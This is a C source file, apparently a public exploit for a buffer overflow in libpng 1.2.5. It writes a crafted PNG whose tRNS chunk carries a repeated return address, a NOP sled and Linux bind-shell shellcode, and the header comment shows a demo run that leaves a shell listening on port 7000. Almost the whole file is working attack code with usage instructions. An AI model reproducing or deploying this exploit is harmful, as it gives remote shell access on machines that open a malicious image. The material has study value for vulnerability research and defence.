/*
 * exploit for libpng, tested on version 1.2.5
 * infamous42md AT hotpop DOT com
 *
 * shouts to mitakeet (hope u patched :D)
 *
 * [n00b_at_localho.outernet] ./po
 * Usage: ./po < retaddr > [ outfile ]
 *
 * -all u need to give is retaddr, the default file it creates is controlled by
 * the define below, or u can pass a diff outfile name on the command line.
 * the output is not an entire png, just enough to trigger the bug. i've also
 * included a simple program to test with.
 *
 * [n00b_at_localho.outernet] netstat -ant | grep 7000
 * [n00b_at_localho.outernet] gcc pnouch.c -Wall -o po
 * [n00b_at_localho.outernet] gcc pngslap.c -o slapped -lz -lm lib/libpng12.so
 * [n00b_at_localho.outernet] ./po 0xbffff8b0
 * [n00b_at_localho.outernet] ./slapped britnay_spares_pr0n.png
 * libpng warning: Missing PLTE before tRNS
 * libpng warning: tRNS: CRC error
 * [n00b_at_localho.outernet] netstat -ant | grep 7000
 * tcp 0 0 0.0.0.0:7000 0.0.0.0:* LISTEN
 *
 */
#include <stdio.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
 

#define OUTFILE "britnay_spares_pr0n.png"
#define BS 0x1000
#define ALIGN 0
#define NOP 0x90
#define NNOPS 100
#define RETADDR_BYTES 300
 

#define die(x) do{ perror((x)); exit(EXIT_FAILURE);}while(0)
 

/* identifies a file as a png */
#define MAJIC_LEN sizeof(png_majic)
u_char png_majic[] = { 0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a };
 

/*
 * appears first, gives len/width/etc. important part is setting the color type
 * to 0x03, byte 10 of the IHDR data. that signfies that a PALLETE chunk should
 * be present. but we dont have one, and that is how the len check is bypassed.
 * the chunk len includes only the data, not the len field itself, or the id, or
 * the crc at the end. these bytes are stolen from the advisory.
 */
#define IHDR_LEN sizeof(png_ihdr)
u_char png_ihdr[] = { 0x00, 0x00, 0x00, 0x0d, /* chunk len */
                    0x49, 0x48, 0x44, 0x52, /* chunk id */
                    0x00, 0x00, 0x00, 0x5b, 0x00, 0x00, 0x00, 0x45,
                    0x08, 0x03, 0x00, 0x00, 0x01,
                    0x65, 0x33, 0x5a, 0xd6 /* chunk crc */
};
 

/*
 * this is the tRNS type chunk, this is the evil chunk that actually contains
 * the shellcode.
 */
#define TRNS_LEN sizeof(png_trns_len_id)
u_char png_trns_len_id[] = { 0x00, 0x00, 0x00, 0x00, /* chunk len filled in*/
                           0x74, 0x52, 0x4e, 0x53 /* chunk id */
                          /* begin chunk data */
                          /* retaddr, NOPS, shellcode, CRC will follow */
};
 

/* call them shell code */
#define SHELL_LEN strlen(sc)
char sc[] =
    "\x31\xc0\x50\x50\x66\xc7\x44\x24\x02\x1b\x58\xc6\x04\x24\x02\x89\xe6"
    "\xb0\x02\xcd\x80\x85\xc0\x74\x08\x31\xc0\x31\xdb\xb0\x01\xcd\x80\x50"
    "\x6a\x01\x6a\x02\x89\xe1\x31\xdb\xb0\x66\xb3\x01\xcd\x80\x89\xc5\x6a"
    "\x10\x56\x50\x89\xe1\xb0\x66\xb3\x02\xcd\x80\x6a\x01\x55\x89\xe1\x31"
    "\xc0\x31\xdb\xb0\x66\xb3\x04\xcd\x80\x31\xc0\x50\x50\x55\x89\xe1\xb0"
    "\x66\xb3\x05\xcd\x80\x89\xc5\x31\xc0\x89\xeb\x31\xc9\xb0\x3f\xcd\x80"
    "\x41\x80\xf9\x03\x7c\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62"
    "\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
 

 

 

int main(int argc, char **argv)
{
    int fd = 0, len = 0, x = 0, chunk_len = 0;
    char *filename = OUTFILE;
    u_char buf[BS];
    u_long retaddr = 0;
 

    if(argc < 2){
        fprintf(stderr, "Usage: %s < retaddr > [ outfile ]\n", argv[0]);
        return EXIT_FAILURE;
    }
    if(argc > 2)
        filename = argv[2];
 

    memset(buf, 0, BS);
    sscanf(argv[1], "%lx", &retaddr);
 

    /* create buffer:
     * png id - png ihdr - png trns - retaddr - NOPS - shell - crc(don't need)
     */
    memcpy(buf, png_majic, MAJIC_LEN);
    len += MAJIC_LEN;
    memcpy(buf+len, png_ihdr, IHDR_LEN);
    len += IHDR_LEN;
    memcpy(buf+len, png_trns_len_id, TRNS_LEN);
    len += TRNS_LEN;
 

    for(x = 0; x < RETADDR_BYTES-3; x += 4)
        memcpy(buf+len+x+ALIGN, &retaddr, sizeof(retaddr));
    x += ALIGN;
    len += x;
    memset(buf+len, NOP, NNOPS);
    len += NNOPS;
    memcpy(buf+len, sc, SHELL_LEN);
    len += SHELL_LEN;
 

    /* length of chunk data */
    chunk_len = x + NNOPS + SHELL_LEN;
    *(u_long *)(buf+MAJIC_LEN+IHDR_LEN) = htonl(chunk_len);
 

    /* include the crc */
    len += sizeof(u_long);
 

    /* create the file */
    if( (fd = open(filename, O_WRONLY|O_CREAT|O_EXCL, 0666)) < 0)
        die("open");
    if(write(fd, buf, len) != len)
        die("write");
    close(fd);
    
    return 0;
} 
